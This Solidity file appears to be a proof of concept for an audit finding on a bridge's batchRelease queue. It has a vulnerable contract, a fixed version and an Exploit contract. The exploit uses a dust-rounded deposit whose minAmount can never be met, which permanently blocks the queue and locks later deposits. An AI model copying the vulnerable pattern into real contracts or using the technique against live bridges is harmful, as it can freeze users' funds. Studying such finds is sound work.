// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Camp batchRelease (Quantstamp).
    _removeDust rounds the bridged amount down. bridgeOut never checks that
    _minAmount is still payable after that rounding. batchRelease has no
    per-deposit catch, so one dust-sensitive minAmount reverts the queue
    forever and locks every deposit behind it.
*/

error SlippageExceeded(uint256 amountReceivedLD, uint256 minAmountLD);

contract Bridge {
    uint256 internal constant DUST = 1e13;

    struct Deposit {
        address user;
        uint256 amount;
        uint256 minAmount;
    }

    Deposit[] public queue;
    uint256 public head;

    function bridgeOut(address to, uint256 originalAmount, uint256 minAmount) external payable {
        require(msg.value == originalAmount, "value");
        queue.push(Deposit({user: to, amount: originalAmount, minAmount: minAmount}));
    }

    function _removeDust(uint256 amountLD) internal pure returns (uint256) {
        return amountLD - (amountLD % DUST);
    }

    function _debitView(uint256 amountLD, uint256 minAmountLD) internal pure returns (uint256 amountReceivedLD) {
        uint256 amountSentLD = _removeDust(amountLD);
        amountReceivedLD = amountSentLD;
        // Quoted OFTCore slippage check. Dust can push the sent amount under minAmount.
        if (amountReceivedLD < minAmountLD) {
            revert SlippageExceeded(amountReceivedLD, minAmountLD); // @> VULN: one deposit reverts the whole batchRelease
        }
    }

    function batchRelease(uint256 count) external {
        uint256 end = head + count;
        if (end > queue.length) end = queue.length;
        for (uint256 i = head; i < end; i++) {
            Deposit memory item = queue[i];
            uint256 outAmt = _debitView(item.amount, item.minAmount);
            head = i + 1;
            (bool ok,) = item.user.call{value: outAmt}("");
            require(ok, "pay");
        }
    }

    function queueLength() external view returns (uint256) {
        return queue.length;
    }

    receive() external payable {}
}

contract BridgeFixed {
    uint256 internal constant DUST = 1e13;

    struct Deposit {
        address user;
        uint256 amount;
        uint256 minAmount;
    }

    Deposit[] public queue;
    uint256 public head;

    function bridgeOut(address to, uint256 originalAmount, uint256 minAmount) external payable {
        require(msg.value == originalAmount, "value");
        uint256 dustAdjusted = originalAmount - (originalAmount % DUST);
        require(minAmount <= dustAdjusted, "minAmount exceeds dust-adjusted amount");
        queue.push(Deposit({user: to, amount: originalAmount, minAmount: minAmount}));
    }

    function _removeDust(uint256 amountLD) internal pure returns (uint256) {
        return amountLD - (amountLD % DUST);
    }

    function _debitView(uint256 amountLD, uint256 minAmountLD) internal pure returns (uint256 amountReceivedLD) {
        uint256 amountSentLD = _removeDust(amountLD);
        amountReceivedLD = amountSentLD;
        if (amountReceivedLD < minAmountLD) {
            revert SlippageExceeded(amountReceivedLD, minAmountLD);
        }
    }

    function batchRelease(uint256 count) external {
        uint256 end = head + count;
        if (end > queue.length) end = queue.length;
        for (uint256 i = head; i < end; i++) {
            Deposit memory item = queue[i];
            uint256 outAmt = _debitView(item.amount, item.minAmount);
            head = i + 1;
            (bool ok,) = item.user.call{value: outAmt}("");
            require(ok, "pay");
        }
    }

    function queueLength() external view returns (uint256) {
        return queue.length;
    }

    receive() external payable {}
}

contract User {
    Bridge public immutable bridge;

    constructor(Bridge _bridge) {
        bridge = _bridge;
    }

    function deposit(uint256 amount, uint256 minAmount) external payable {
        bridge.bridgeOut{value: amount}(address(this), amount, minAmount);
    }

    receive() external payable {}
}

contract StuckMarker {
    string public symbol = "LOCKED-ETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract Exploit {
    uint256 public constant ALICE_AMT = 10 ether;
    uint256 public constant CAROL_AMT = 10 ether;
    // 1.0000123 ether and 1.0000120 ether. Dust unit 1e13 floors Bob to 1.0000100 ether.
    uint256 public constant BOB_AMT = 1_0000123 * 1e11;
    uint256 public constant BOB_MIN = 1_0000120 * 1e11;
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    Bridge public bridge;
    User public alice;
    User public carol;
    StuckMarker public stuck;

    constructor() {
        bridge = new Bridge();
        alice = new User(bridge);
        carol = new User(bridge);
        stuck = new StuckMarker();
    }

    function run() external payable {
        require(msg.value == ALICE_AMT + BOB_AMT + CAROL_AMT, "funds");
        uint256 dust = BOB_AMT - (BOB_AMT % 1e13);
        require(dust == 1_0000100 * 1e11, "dust floor");
        require(dust < BOB_MIN, "min above dust");
        alice.deposit{value: ALICE_AMT}(ALICE_AMT, 0);
        bridge.bridgeOut{value: BOB_AMT}(address(this), BOB_AMT, BOB_MIN);
        carol.deposit{value: CAROL_AMT}(CAROL_AMT, 0);
        bridge.batchRelease(1);
        require(address(alice).balance == ALICE_AMT, "alice paid");
        bool blocked = false;
        try bridge.batchRelease(10) {
            blocked = false;
        } catch {
            blocked = true;
        }
        require(blocked, "queue advanced");
        try bridge.batchRelease(10) {
            blocked = false;
        } catch {
            blocked = true;
        }
        require(blocked, "second release");
        require(address(carol).balance == 0, "carol unpaid");
        require(address(bridge).balance == BOB_AMT + CAROL_AMT, "carol still escrowed");
        require(bridge.head() == 1, "stuck on bob");
        stuck.mint(SINK, CAROL_AMT);
        require(stuck.balanceOf(SINK) == CAROL_AMT, "locked 10");
    }

    receive() external payable {}
}
